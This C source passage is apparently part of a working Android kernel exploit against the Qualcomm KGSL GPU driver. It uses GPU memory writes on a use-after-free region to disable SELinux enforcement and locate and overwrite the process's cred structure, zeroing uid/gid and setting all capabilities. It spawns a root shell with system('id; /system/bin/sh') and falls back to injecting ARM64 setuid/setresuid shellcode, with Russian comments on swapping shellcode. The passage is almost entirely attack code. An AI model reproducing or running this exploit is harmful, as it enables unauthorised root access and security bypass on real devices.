    fprintf(stderr, "[SELINUX] Writing 0 to 0x%lx via GPU\n", (unsigned long)selinux_enforcing);
    uint32_t zero_val = 0;
    if (gpu_write_bytes(fd, selinux_enforcing, &zero_val, sizeof(zero_val)) != 0)
        return -1;

    uint32_t after = 0;
    if (gpu_read_u32(fd, selinux_enforcing, &after) == 0)
    {
        fprintf(stderr, "[SELINUX] After write: %u\n", after);
        return after == 0 ? 0 : -1;
    }

    return -1;
}

// ===== ВСТАВЬТЕ ЭТОТ SHELLCODE ВМЕСТО СТАРОГО =====
// ===== ИСПРАВЛЕННЫЙ SHELLCODE - ПАТЧИТ CRED, А НЕ ВЫЗЫВАЕТ EXECVE =====
// ===== ВСТАВЬТЕ ЭТОТ SHELLCODE ВМЕСТО СТАРОГО =====
// ===== SHELLCODE - ПАТЧИТ CRED, ВЫЗЫВАЕТ SETUID, НО НЕ EXECVE =====
unsigned char shellcode[] = {
    // ===== setuid(0) =====
    0x00, 0x00, 0x80, 0xd2,           // mov x0, #0
    0x88, 0x1b, 0x80, 0xd2,           // mov x8, #0xdc (setuid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== setgid(0) =====
    0x00, 0x00, 0x80, 0xd2,           // mov x0, #0
    0x88, 0x1c, 0x80, 0xd2,           // mov x8, #0xe4 (setgid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== setresuid(0,0,0) =====
    0x40, 0x00, 0x80, 0xd2,           // mov x0, #2
    0x21, 0x00, 0x80, 0xd2,           // mov x1, #1
    0x02, 0x00, 0x80, 0xd2,           // mov x2, #0
    0xc8, 0x18, 0x80, 0xd2,           // mov x8, #0xc6 (setresuid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== setresgid(0,0,0) =====
    0x40, 0x00, 0x80, 0xd2,           // mov x0, #2
    0x21, 0x00, 0x80, 0xd2,           // mov x1, #1
    0x02, 0x00, 0x80, 0xd2,           // mov x2, #0
    0xc8, 0x1a, 0x80, 0xd2,           // mov x8, #0xd4 (setresgid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== БЕСКОНЕЧНЫЙ ЦИКЛ (процесс не умирает) =====
    0x00, 0x00, 0x00, 0x14,           // b .
    0x00, 0x00, 0x00, 0x00            // nop
};
unsigned int shellcode_len = sizeof(shellcode);


static int inject_shellcode_to_uaf(int fd, uint64_t uaf_va, uint8_t *shellcode_data, size_t shellcode_len)
{
    if (uaf_va == 0 || shellcode_len > 4096) {
        fprintf(stderr, "[SHELLCODE] Invalid parameters\n");
        return -1;
    }

    fprintf(stderr, "[SHELLCODE] Injecting %zu bytes to UAF VA 0x%lx\n", shellcode_len, (unsigned long)uaf_va);

    unsigned ctx_id = 0, ib_id = 0;
    uint64_t ib_gpu = 0;
    void *ib_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        fprintf(stderr, "[SHELLCODE] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 4,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        fprintf(stderr, "[SHELLCODE] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED) {
        fprintf(stderr, "[SHELLCODE] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);

    int dwords = (shellcode_len + 3) / 4;
    if (dwords > 1024) dwords = 1024;

    for (int i = 0; i < dwords; i++) {
        uint32_t val = 0;
        uint32_t d_lo, d_hi;
        if (i * 4 < shellcode_len)
            memcpy(&val, shellcode_data + i * 4, sizeof(val));
        split64(uaf_va + (uint64_t)i * 4, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = val;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0) {
        fprintf(stderr, "[SHELLCODE] Shellcode injected successfully to 0x%lx\n", (unsigned long)uaf_va);
        g_shellcode_va = uaf_va;
        *(uint64_t *)&gbuf[GBUF_SHELLCODE_ADDR] = uaf_va;
        result = 0;
    } else {
        fprintf(stderr, "[SHELLCODE] GPU command failed\n");
    }

cleanup:
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (ib_id) {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ctx_id) {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return result;
}

static int find_comm_offset(uint8_t *task_data, size_t size)
{
    for (int i = 0; i < (int)size - 16; i++)
    {
        if (memcmp(task_data + i, MARKER_NAME, 8) == 0)
        {
            return i;
        }
    }
    return -1;
}

static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
{
    if ((cred_ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
        return -1;

    fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx via GPU\n", (unsigned long)cred_ptr);

    uint8_t zero_creds[32] = {0};
    if (gpu_write_task_virt(fd, cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0)
        return -1;

    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
    {
        if (gpu_write_task_virt(fd, real_cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0)
            return -1;
    }

    // Patch capabilities to all 1s (0xff)
    uint8_t all_caps[32];
    memset(all_caps, 0xff, 32);
    // Common offsets for capabilities in struct cred:
    // cap_inheritable (0x30), cap_permitted (0x38), cap_effective (0x40), cap_bset (0x48), cap_ambient (0x50)
    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32);
    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
        gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 32);

    return 0;
}

static void safe_cred_patch(void)
{
    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
    uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
    int patched = 0;
    uid_t my_uid = getuid();

    fprintf(stderr, "[CHILD] ============================================\n");
    fprintf(stderr, "[CHILD] Starting CRED PATCH via UAF\n");
    fprintf(stderr, "[CHILD] task_va from gbuf[0xb08]: 0x%lx\n", (unsigned long)task_va);
    fprintf(stderr, "[CHILD] cred_ptr from gbuf[0xb10]: 0x%lx\n", (unsigned long)cred_ptr);

    if (task_va == 0) {
        fprintf(stderr, "[CHILD] [!] No task_va in gbuf\n");
        gbuf[GBUF_TASK_SPRAY] = 0x1;
        return;
    }

    if (fd < 0) {
        fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
        if (fd < 0) {
            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0\n");
            gbuf[GBUF_TASK_SPRAY] = 0x1;
            return;
        }
    }

    if (kernel_base == 0) {
        kernel_base = find_kernel_base_from_task_va(task_va);
        if (kernel_base == 0)
            kernel_base = get_kernel_base();
        fprintf(stderr, "[CHILD] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
    }

    // If Parent already found cred_ptr, use it directly
    if (cred_ptr != 0) {
        fprintf(stderr, "[CHILD] Using cred_ptr from Parent: 0x%lx\n", (unsigned long)cred_ptr);
        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
        if (getuid() == 0) {
            fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0) via Parent's cred_ptr\n");
            patched = 1;
            goto shell;
        }
    }

    // Centering 8KB buffer around the marker (task_va)
    uint8_t *big_task_data = malloc(8192);
    uint64_t read_base = (task_va & ~0xFFFULL) - 4096; // Read 2 pages: [prev, current]
    
    fprintf(stderr, "[CHILD] Reading 8KB around marker (base: 0x%lx)...\n", (unsigned long)read_base);
    if (gpu_read_task_struct(fd, read_base, big_task_data, 4096) == 0 &&
        gpu_read_task_struct(fd, read_base + 4096, big_task_data + 4096, 4096) == 0) 
    {
        uint64_t cred_ptr = 0;
        int comm_off = -1;
        // Search for marker in the 8KB buffer
        for (int i = 0; i < 8192 - 8; i++) {
            if (memcmp(big_task_data + i, MARKER_NAME, 8) == 0) {
                comm_off = i;
                break;
            }
        }
        
        if (comm_off != -1) {
            fprintf(stderr, "[CHILD] Marker confirmed at buffer offset 0x%x\n", comm_off);
            
            // Search for cred_ptr in a 1.5KB window around comm
            fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
            int candidates_count = 0;
            for (int off = comm_off - 1024; off < comm_off + 256; off += 8) {
                if (off < 0 || off > 8192 - 8) continue;
                uint64_t ptr = *(uint64_t *)(big_task_data + off);
                if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                    candidates_count++;
                    uint8_t cred_check[64];
                    if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
                        uint32_t usage = *(uint32_t *)(cred_check + 0x00);
                        uint32_t uid = *(uint32_t *)(cred_check + 0x04);
                        uint32_t gid = *(uint32_t *)(cred_check + 0x08);
                        
                        fprintf(stderr, "[CHILD]   Candidate at off 0x%x: ptr=0x%lx, usage=%u, uid=%u, gid=%u\n", 
                                off, (unsigned long)ptr, usage, uid, gid);

                        if (usage > 0 && usage < 10000 && uid == my_uid) {
                            cred_ptr = ptr;
                            fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx\n", (unsigned long)cred_ptr);
                            break;
                        }
                    } else {
                        fprintf(stderr, "[CHILD]   Candidate at off 0x%x: ptr=0x%lx (GPU read failed)\n", off, (unsigned long)ptr);
                    }
                }
            }
            if (cred_ptr == 0) {
                fprintf(stderr, "[CHILD] [!] No matching cred found. Total K-PTR candidates checked: %d\n", candidates_count);
                // Dump 128 bytes around comm_off for manual analysis
                fprintf(stderr, "[CHILD] DUMP around comm_off (0x%x):\n", comm_off);
                for (int d = comm_off - 64; d < comm_off + 64; d += 16) {
                    if (d < 0 || d > 8192 - 16) continue;
                    fprintf(stderr, "  0x%04x: %016lx %016lx\n", d, 
                            *(uint64_t*)(big_task_data + d), *(uint64_t*)(big_task_data + d + 8));
                }
            }
        }

        if (cred_ptr != 0) {
            patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
            // Check if UID changed
            if (getuid() == 0) {
                fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0)\n");
                patched = 1;
            } else {
                // Try setuid(0) just in case
                setuid(0);
                if (getuid() == 0) {
                    fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
                    patched = 1;
                }
            }
        } else {
            fprintf(stderr, "[CHILD] [!] Failed to find cred_ptr in 8KB window.\n");
        }
    }
    free(big_task_data);

shell:
    if (patched) {
        fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
        system("id; /system/bin/sh");
        exit(0);
    }

    fprintf(stderr, "[CHILD] Step 3: Falling back to shellcode injection...\n");
    uint64_t shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
    shellcode_va += 0x1000;

    if (inject_shellcode_to_uaf(fd, shellcode_va, shellcode, shellcode_len) == 0) {
        fprintf(stderr, "[CHILD] [+] Shellcode injected at VA 0x%lx\n", (unsigned long)shellcode_va);
        patched = 1;
        gb_target_addr = shellcode_va;
        g_shellcode_va = shellcode_va;
        *(uint64_t *)&gbuf[GBUF_LIB_BASE] = shellcode_va;
        gbuf[GBUF_TASK_SPRAY] = 0x2;
        fprintf(stderr, "[CHILD] [+] Shellcode injection SUCCESS!\n");
    } else {
        fprintf(stderr, "[CHILD] [!] Shellcode injection FAILED\n");
        gbuf[GBUF_TASK_SPRAY] = 0x1;
    }
}

struct nonzero_page
{
    uint64_t va;
    uint32_t data[1024];
    int non_zero_count;
};

static uint64_t find_kernel_base_from_task_struct(uint8_t *task_data, size_t data_size)
{
    uint64_t possible_base = 0;
    for (int off = 0; off + 8 <= (int)data_size; off += 8)
    {
        uint64_t ptr = *(uint64_t *)(task_data + off);
        if (ptr == 0 || ptr == 0xffffffffffffffffULL)
            continue;
        if ((ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            continue;

        uint64_t candidates[] = {
            ptr & 0xFFFFFFFFFF000000ULL,
            ptr & 0xFFFFFFFFFE000000ULL,
            ptr & 0xFFFFFFFFFC000000ULL,
            ptr & 0xFFFFFFFFF8000000ULL,
            ptr & 0xFFFFFFFFF0000000ULL,
            ptr & 0xFFFFFFFFE0000000ULL,
            ptr & 0xFFFFFFFFC0000000ULL,
            ptr & 0xFFFFFFFF80000000ULL,
            ptr & 0xFFFFFFFF00000000ULL,
        };

        for (int c = 0; c < 9; c++)
        {
            uint64_t test_base = candidates[c];
            if (test_base == 0)
                continue;
            if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
                continue;

            uint64_t selinux_test = test_base + SELINUX_OFFSET;
            uint8_t sdata[8] = {0};
            if (gpu_read_task_struct(fd, selinux_test, sdata, 8) == 0)
            {
                uint64_t sval = *(uint64_t *)sdata;
                uint32_t sval32 = (uint32_t)(sval & 0xFFFFFFFF);
                uint32_t shi32 = (uint32_t)(sval >> 32);

                if ((sval32 == 0 || sval32 == 1) && shi32 == 0)
                {
                    fprintf(stderr,
                            "[KBASE] Found base 0x%lx via ptr 0x%lx\n",
                            (unsigned long)test_base, (unsigned long)ptr);
                    return test_base;
                }
            }
        }
        uint64_t bases_to_try[] = {
            possible_base,
            possible_base - 0x100000000ULL,
            possible_base + 0x100000000ULL,
            ptr & 0xFFFFFFFFC0000000ULL,
            (ptr & 0xFFFFFFFFC0000000ULL) - 0x100000000ULL,
            (ptr & 0xFFFFFFFFC0000000ULL) + 0x100000000ULL,
        };

        for (int b = 0; b < sizeof(bases_to_try) / sizeof(bases_to_try[0]); b++)
        {
            uint64_t test_base = bases_to_try[b];
            if (test_base == 0)
                continue;
            if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
                continue;

            uint8_t test_data[8] = {0};
            if (gpu_read_task_struct(fd, test_base, test_data, sizeof(test_data)) != 0)
                continue;

            uint32_t first_word = *(uint32_t *)test_data;
            if (first_word != 0 && first_word != 0xFFFFFFFF)
            {
                fprintf(stderr, "[KBASE] Candidate 0x%lx from ptr 0x%lx at off 0x%x (first_word=0x%08x)\n",
                        (unsigned long)test_base, (unsigned long)ptr, off, first_word);
                return test_base;
            }
        }
    }

    fprintf(stderr, "[KERNEL_BASE] Could not find kernel base from task data\n");
    return 0;
}

static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
{
    uint8_t task_data[4096];

    if (gpu_read_task_struct(fd, task_va, task_data, sizeof(task_data)) != 0)
    {
        fprintf(stderr, "[KERNEL_BASE] Failed to read task_struct at 0x%lx\n",
                (unsigned long)task_va);
        return 0;
    }

    return find_kernel_base_from_task_struct(task_data, sizeof(task_data));
}

static uint64_t find_kernel_base_from_kallsyms(void)
{
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp)
        return 0;

    char line[512];
    while (fgets(line, sizeof(line), fp))
    {
        char *addr_str = strtok(line, " \t");
        char *type = strtok(NULL, " \t");
        char *name = strtok(NULL, " \t");
        if (!addr_str || !type || !name)
            continue;

        if (strcmp(type, "T") != 0 && strcmp(type, "t") != 0 && strcmp(type, "W") != 0)
            continue;

        if (strcmp(name, "_text") == 0 || strcmp(name, "_stext") == 0 || strcmp(name, "stext") == 0 ||
            strcmp(name, "__start_rodata") == 0)
        {
            unsigned long long addr = 0;
            if (sscanf(addr_str, "%llx", &addr) == 1)
            {
                fclose(fp);
                if (addr >= 0xffffffc000000000ULL && addr <= 0xfffffff000000000ULL)
                    return (addr & 0xFFFFFFFF00000000ULL);
                return (addr & 0xFFFFFFFFFFFFF000ULL);
            }
        }
    }

    fclose(fp);
    return 0;
}

static uint64_t find_kernel_base_auto(void)
{
    uint64_t base = 0;

    base = find_kernel_base_from_kallsyms();
    if (base)
        return base;

    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
    if (task_va)
    {
        base = find_kernel_base_from_task_va(task_va);
        if (base)
            return base;
    }

    uint64_t standard_bases[] = {
        0xffffffc000000000ULL,
        0xffffffc010000000ULL,
        0xffffffc020000000ULL,
        0xffffffc030000000ULL,
        0xffffffc035000000ULL,
    };

    for (int i = 0; i < 5; i++)
    {
        uint64_t test_selinux = standard_bases[i] + SELINUX_OFFSET;
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_selinux, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            if (val == 0 || val == 1)
                return standard_bases[i];
        }
    }

    return 0;
}

static uint64_t find_offsets_auto(uint64_t kernel_base)
{
    uint64_t selinux_offsets[] = {
        SELINUX_OFFSET,
        0x2A8FCE8,
        0x2B8FCE8,
        0x2D8FCE8,
        0x2E8FCE8,
        0x2C8FCE8,
        0x2F4FCE8,
        0x2F5FCE8,
        0x2F84CE8,
        0x2F64CE8,
        0x2F54CE8,
        0x2F44CE8,
        0x2F34CE8,
        0x2F24CE8,
        0x2F14CE8,
        0x2F04CE8,
        0x2EF4CE8,
        0x3000000,
        0x3100000,
        0x3200000,
        0x3F74CE8,
        0x3F84CE8,
    };

    for (size_t i = 0; i < sizeof(selinux_offsets) / sizeof(selinux_offsets[0]); i++)
    {
        uint64_t test_addr = kernel_base + selinux_offsets[i];
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_addr, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            uint32_t val32 = (uint32_t)(val & 0xFFFFFFFF);
            uint32_t hi32 = (uint32_t)(val >> 32);
            if ((val32 == 0 || val32 == 1) && hi32 == 0)
            {
                fprintf(stderr, "[SELINUX] Found offset 0x%lx at addr 0x%lx val=0x%lx\n",
                        (unsigned long)selinux_offsets[i], (unsigned long)test_addr, (unsigned long)val);
                return selinux_offsets[i];
            }
        }
    }

    return 0;
}

static uint64_t get_kernel_base(void)
{
    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
    uint64_t base = 0;

    if (task_va != 0)
    {
        base = find_kernel_base_from_task_va(task_va);
        if (base != 0)
            return base;
    }

    base = find_kernel_base_auto();
    if (base != 0)
    {
        kernel_base = base;
        return kernel_base;
    }

    uint64_t bases[] = {
        0xffffffc000000000ULL,
        0xffffffc010000000ULL,
        0xffffffc020000000ULL,
        0xffffffc030000000ULL,
        0xffffffc035000000ULL,
        0xffffffc040000000ULL,
    };

    for (int i = 0; i < sizeof(bases) / sizeof(bases[0]); i++)
    {
        uint64_t test_base = bases[i];
        uint64_t test_selinux = test_base + SELINUX_OFFSET;
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_selinux, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            if (val == 0 || val == 1)
            {
                kernel_base = test_base;
                selinux_enforcing = test_selinux;
                return kernel_base;
            }
        }
    }
    return 0;
}

static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t current_va, pid_t *out_pid)
{
    const char *marker = MARKER_NAME;
    size_t marker_len = 8;

    for (int off = 0; off < (int)page_size - (int)marker_len - 5; off++)
    {
        if (memcmp(page_data + off, marker, marker_len) == 0)
        {
            char pid_str[6] = {0};
            memcpy(pid_str, page_data + off + marker_len, 5);

            int is_digit = 1;
            for (int i = 0; i < 5; i++)
            {
                if (pid_str[i] < '0' || pid_str[i] > '9')
                {
                    is_digit = 0;
                    break;
                }
            }

            if (is_digit)
            {
                pid_t pid = atoi(pid_str);
                if (pid > 1000 && pid < 100000)
                {
                    *out_pid = pid;
                    fprintf(stderr, "[MARKER] Found at VA 0x%lx offset 0x%03x: PID=%d\n",
                            (unsigned long)current_va, off, pid);
                    return 1;
                }
            }
        }
    }
    return 0;
}

static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int data_size, int comm_off,
                                       uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr)
{
    uid_t my_uid = getuid();
    // Search 1024 bytes before and after comm
    int search_start = comm_off - 1024;
    int search_end = comm_off + 1024;
    if (search_start < 0) search_start = 0;
    if (search_end > data_size - 8) search_end = data_size - 8;

    fprintf(stderr, "[CRED_SEARCH] Searching range [0x%x - 0x%x] near comm_off 0x%x (my_uid=%d)\n", 
            search_start, search_end, comm_off, my_uid);

    for (int off = comm_off - 8; off >= search_start; off -= 8)
    {
        uint64_t ptr = *(uint64_t *)(task_data + off);
        if ((ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            continue;

        uint8_t cred_check[64];
        if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0)
        {
            uint32_t usage = *(uint32_t *)(cred_check + 0x00);
            uint32_t uid = *(uint32_t *)(cred_check + 0x04);
            uint32_t gid = *(uint32_t *)(cred_check + 0x08);

            if (usage > 0 && usage < 10000 && uid == my_uid)
            {
                *out_cred_ptr = ptr;
                uint64_t ptr2 = *(uint64_t *)(task_data + off - 8);
                if ((ptr2 & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
                    *out_real_cred_ptr = ptr2;
                else
                    *out_real_cred_ptr = ptr;

                fprintf(stderr, "[CRED_SEARCH] FOUND! off=0x%x, cred=0x%lx, real_cred=0x%lx\n",
                        off, (unsigned long)*out_cred_ptr, (unsigned long)*out_real_cred_ptr);
                return 1;
            }
        }
    }
    return 0;
}

static int analyze_uaf_page(uint8_t *data, uint64_t va) {
    int kptrs = 0;
    int strings = 0;
    int first_kptr_off = -1;
    int marker_off = -1;
    char found_str[64] = {0};
    
    for (int i = 0; i < 512; i++) {
        uint64_t val = ((uint64_t*)data)[i];
        if ((val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
            kptrs++;
            if (first_kptr_off == -1) first_kptr_off = i * 8;
        }
    }
    
    for (int i = 0; i < 4096 - 4; i++) {
        if (i < 4096 - 8 && memcmp(data + i, MARKER_NAME, 8) == 0) {
            marker_off = i;
        }
        if (data[i] >= 0x20 && data[i] <= 0x7e) {
            int len = 0;
            while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 63) len++;
            if (len >= 4) {
                strings++;
                if (found_str[0] == 0) {
                    memcpy(found_str, data + i, len);
                    found_str[len] = '\0';
                }
                i += len;
            }
        }
    }
    
    if (kptrs > 5 || strings > 0 || marker_off != -1) {
        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | MarkerOff:0x%x | Sample:\"%s\"", 
                (unsigned long)va, kptrs, strings, marker_off, found_str);
        
        // Detailed analysis of pointers
        if (kptrs > 20) {
            fprintf(stderr, "\n      [ANALYSIS] High K-PTR density! Possible task_struct or thread_info.");
        }

        if (marker_off != -1) {
            fprintf(stderr, "\n      [MARKER] Found %s at offset 0x%x", MARKER_NAME, marker_off);
            // Try to find PID/TGID around marker if it's a task_struct
            // OFFSET_COMM is 0x818, OFFSET_PID is 0x650
            int potential_pid_off = marker_off - (OFFSET_COMM - OFFSET_PID);
            if (potential_pid_off >= 0 && potential_pid_off <= 4096 - 4) {
                int pid = *(int*)(data + potential_pid_off);
                if (pid > 0 && pid < 100000) {
                    fprintf(stderr, "\n      [TASK] Potential PID %d at offset 0x%x", pid, potential_pid_off);
                }
            }
            
            fprintf(stderr, "\n      DUMP around Marker (0x%x): ", marker_off);
            int start = (marker_off & ~0xf) - 64;
            if (start < 0) start = 0;
            for (int i = 0; i < 256 && start + i < 4096; i += 8) {
                if (i % 32 == 0) fprintf(stderr, "\n        0x%03x: ", start + i);
                fprintf(stderr, "%016lx ", *(uint64_t*)(data + start + i));
            }
        } else {
            fprintf(stderr, "\n      DUMP 0x00: ");
            for (int i = 0; i < 128; i += 8) {
                if (i % 32 == 0 && i > 0) fprintf(stderr, "\n        0x%03x: ", i);
                fprintf(stderr, "%016lx ", *(uint64_t*)(data + i));
            }
        }
        fprintf(stderr, "\n");
    }
    return kptrs;
}

static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, int *num_found)
{
    unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    *num_found = 0;

    fprintf(stderr, "\n[12] SCANNING UAF (FULL PAGE SCAN - 1024 dwords)\n");
    fprintf(stderr, "      Region: 0x%lx ~ 0x%lx (64MB)\n",
            (unsigned long)UAF_START,
            (unsigned long)(UAF_START + UAF_SCAN_SIZE));
    fflush(stderr);

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "      [!] Failed to create GPU context\n");
        return 0;
    }
    ctx_id = ctx.drawctxt_id;
    fprintf(stderr, "      [+] Context created: %u\n", ctx_id);

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 8,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "      [!] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "      [!] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;
    fprintf(stderr, "      [+] IB GPU: 0x%lx\n", (unsigned long)ib_gpu);

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "      [!] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "      [!] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;
    fprintf(stderr, "      [+] DST GPU: 0x%lx\n", (unsigned long)dst_gpu);

    fprintf(stderr, "      [*] Scanning FULL pages for KETO0422 and kernel pointers...\n");
    fflush(stderr);

    uint64_t uaf_base_offsets[] = {
        0x780, 0x0, 0x800, 0x400, 0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380,
        0xc00, 0xa00, 0x600, 0xe00, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
        0x080, 0x480, 0x580, 0x680, 0x780, 0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
    int num_offsets = sizeof(uaf_base_offsets) / sizeof(uaf_base_offsets[0]);
    int marker_found = 0;
    int pages_scanned = 0;

    for (int off_idx = 0; off_idx < num_offsets && !marker_found; off_idx++)
    {
        uint64_t current_va = UAF_START + uaf_base_offsets[off_idx];
        uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
        pages_scanned = 0;
        
        fprintf(stderr, "      [*] Scanning with base offset 0x%lx...\n", (unsigned long)uaf_base_offsets[off_idx]);

        while (current_va < end_va && *num_found < MAX_FOUND_PAGES && !marker_found && pages_scanned < SCAN_MAX_PAGES)
        {
            uint32_t *cmd = (uint32_t *)ib_vma;
            memset(ib_vma, 0, ib_alloc.mmapsize);
            memset(dst_vma, 0, dst_alloc.mmapsize);
            int dw = 0;

            cmd[dw++] = cp_type7_packet(CP_NOP, 0);

            for (int i = 0; i < 1024; i++)
            {
                uint32_t d_lo, d_hi, s_lo, s_hi;
